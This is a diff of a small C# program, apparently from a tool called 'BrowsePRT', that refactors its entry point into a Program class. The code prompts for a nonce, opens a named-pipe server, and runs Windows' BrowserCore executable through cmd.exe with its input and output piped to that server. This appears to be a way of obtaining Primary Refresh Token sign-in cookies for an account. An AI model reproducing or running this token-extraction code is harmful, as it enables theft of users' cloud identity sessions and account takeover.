@@ -1,20 +1,30 @@
 ﻿using System.Diagnostics;
 using BrowsePRT;
 
-using (Process cmd = new Process())
+
+class Program
 {
-        System.Console.WriteLine("Enter nonce: ");
-        string nonce = Console.ReadLine()
-            ?? throw new InvalidOperationException("Nonce is required.");
+    static async Task Main(string[] args)
+    {
+        using (Process cmd = new Process())
+        {
+            System.Console.WriteLine("Enter nonce: ");
+            string nonce = Console.ReadLine()
+                ?? throw new InvalidOperationException("Nonce is required.");
 
-        using var srv = new Server(nonce);
-        Task serverTask = srv.StartAsync();
+            using (var srv = new Server(nonce))
+            {
+                Task serverTask = srv.StartAsync();
 
-        cmd.StartInfo.FileName = "cmd.exe";
-        cmd.StartInfo.Arguments = $"/d /c \"{Helper.GetBrowserCoreFilepath()}\" < \\\\.\\pipe\\{srv.PipeName} > \\\\.\\pipe\\{srv.PipeName}";
-        cmd.StartInfo.UseShellExecute = false;
-        cmd.Start();
+                cmd.StartInfo.FileName = "cmd.exe";
+                cmd.StartInfo.Arguments = $"/d /c \"{Helper.GetBrowserCoreFilepath()}\" < \\\\.\\pipe\\{srv.PipeName} > \\\\.\\pipe\\{srv.PipeName}";
+                cmd.StartInfo.UseShellExecute = false;
+                cmd.Start();
 
-        await serverTask;
-        await cmd.WaitForExitAsync();
+                await serverTask;
+                cmd.WaitForExit();
+            }
+        }
+    }
 }
+
